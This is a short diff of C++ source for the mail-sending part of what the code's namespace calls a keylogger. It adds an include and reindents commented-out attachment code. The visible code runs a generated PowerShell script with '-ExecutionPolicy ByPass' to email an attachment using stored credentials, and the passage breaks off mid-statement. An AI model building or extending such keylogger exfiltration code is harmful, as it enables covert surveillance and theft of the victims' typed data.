@@ -1,4 +1,6 @@
 #include "PowerShellMailSender.h"
+
+#include <Windows.h>
 #include <future>
 
 namespace keylogger::mail
@@ -23,17 +25,17 @@ bool PowerShellMailSender::sendMail(const Mail& mail, const Credentials& credent
         return false;
     }
 
-// Code for multiple attachments
-//    std::string attachmentsAsString;
-//    if (auto begin = mail.attachments.begin(); begin != mail.attachments.end())
-//    {
-//        attachmentsAsString = *begin;
-//        for (auto attachmentIter = std::next(begin); attachmentIter != mail.attachments.end();
-//             ++attachmentIter)
-//        {
-//            attachmentsAsString += "::" + *attachmentIter;
-//        }
-//    }
+    // Code for multiple attachments
+    //    std::string attachmentsAsString;
+    //    if (auto begin = mail.attachments.begin(); begin != mail.attachments.end())
+    //    {
+    //        attachmentsAsString = *begin;
+    //        for (auto attachmentIter = std::next(begin); attachmentIter != mail.attachments.end();
+    //             ++attachmentIter)
+    //        {
+    //            attachmentsAsString += "::" + *attachmentIter;
+    //        }
+    //    }
 
     std::string attachmentsAsString = mail.attachment ? *mail.attachment : "";
     std::string parameters = "-ExecutionPolicy ByPass -File \"" + scriptCreator->getScriptFilePath() +
